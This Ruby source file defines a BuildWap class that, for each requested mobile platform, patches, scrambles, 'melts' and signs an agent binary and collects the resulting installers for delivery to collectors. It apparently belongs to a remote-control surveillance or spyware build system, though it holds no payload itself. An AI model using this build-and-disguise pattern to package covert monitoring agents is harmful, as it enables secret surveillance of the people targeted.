#
#
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildWap < Build

  def initialize
    super
    @platform = 'wap'
  end

  def load(params)
    trace :debug, "Build: load: #{params}"
    @factory = params['_id']
  end

  def unpack
    # nothing to unpack here
  end

  def generate(params)
    trace :debug, "Build: generate: #{params}"

    params['platforms'].each do |platform|
      build = Build.factory(platform.to_sym)

      build.load({'_id' => @factory})
      build.unpack
      build.patch params['binary'].dup
      build.scramble
      build.melt params['melt'].dup
      build.sign params['sign'].dup

      outs = build.outputs

      # purge the unneeded files
      case platform
        when 'blackberry'
          outs.keep_if {|o| o['.cod'] or o['.jad'] }
          outs.delete_if {|o| o['res']}
        when 'android'
          outs.keep_if {|o| o['.apk']}
        when 'symbian'
          outs.keep_if {|o| o['.sisx']}
          outs.delete_if {|o| o['5th'] or o['3rd']}
        when 'winmo'
          outs.keep_if {|o| o['.cab']}
      end
      
      # copy the outputs in our directory
      outs.each do |o|
        FileUtils.cp(File.join(build.tmpdir, o), path(o))
        @outputs << o
      end

      build.clean
    end

  end

  def deliver(params)
    trace :debug, "Build: deliver: #{params}"

    @outputs.each do |o|
      # TODO: put them on the collectors
      puts o
    end

  end

end

end #DB::
end #RCS::
